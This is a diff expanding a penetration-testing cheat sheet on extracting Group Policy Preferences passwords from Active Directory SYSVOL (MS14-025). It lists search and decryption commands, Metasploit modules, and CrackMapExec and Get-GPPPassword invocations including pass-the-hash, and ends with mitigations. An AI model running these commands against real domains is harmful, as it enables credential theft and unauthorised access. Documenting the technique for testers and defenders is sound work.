@@ -1,11 +1,62 @@
+# Passwords in SYSVOL & Group Policy Preferences (GPP)
+
+### Find password in SYSVOL (MS14-025). SYSVOL is the domain-wide share in Active Directory to which all authenticated users have read access. All domain Group Policies are stored here: \\DOMAIN\SYSVOL\DOMAIN\Policies\ .
+
 ### Group Policy Preferences (GPP) allowed admins to create policies using embedded credentials
 
 ### These credentials were encrypted and placed in a "cPassword"
 
 ### They key was accidentally released 
 
-### Pacthed in MS14-025, but it doesn't prevent previous uses
+### Patched in MS14-025, but it doesn't prevent previous uses
 
 ### GPP is an .xml file stored in SYSVOL directory
 
-### command: gpp-decrypt CPASSWORD
+#### 1) findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml (Search for .xml file)
+
+#### 2) gpp-decrypt CPASSWORD
+
+## Alternate Method
+
+### Decrypt a Group Policy Password found in SYSVOL (by 0x00C651E0), using the 32-byte AES key provided by Microsoft in the MSDN - 2.2.1.1.4 Password Encryption
+
+#### 1) echo 'password_in_base64' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b
+
+## Automate the SYSCOL and passwords search
+
+## 1) Metasploit modules to enumerate shares and credentials
+
+ - scanner/smb/smb_enumshares
+
+ - post/windows/gather/enum_shares
+
+ - post/windows/gather/credentials/gpp
+
+## 2) CrackMapExec
+
+ - cme smb 10.10.10.10 -u Administrator -H 89[...]9d -M gpp_autologin
+
+ - cme smb 10.10.10.10 -u Administrator -H 89[...]9d -M gpp_password
+
+## 3) Get-GPPPassword
+
+### with a NULL session
+
+ - Get-GPPPassword.py -no-pass 'DOMAIN_CONTROLLER'
+
+### with cleartext credentials
+
+ - Get-GPPPassword.py 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'
+
+### pass-the-hash
+
+ - Get-GPPPassword.py -hashes 'LMhash':'NThash' 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_
+
+## MITIGATIONS
+
+ - Install KB2962486 on every computer used to manage GPOs which prevents new credentials from being placed in Group Policy Preferences.
+
+ - Delete existing GPP xml files in SYSVOL containing passwords.
+
+ - Don’t put passwords in files that are accessible by all authenticated users.
+
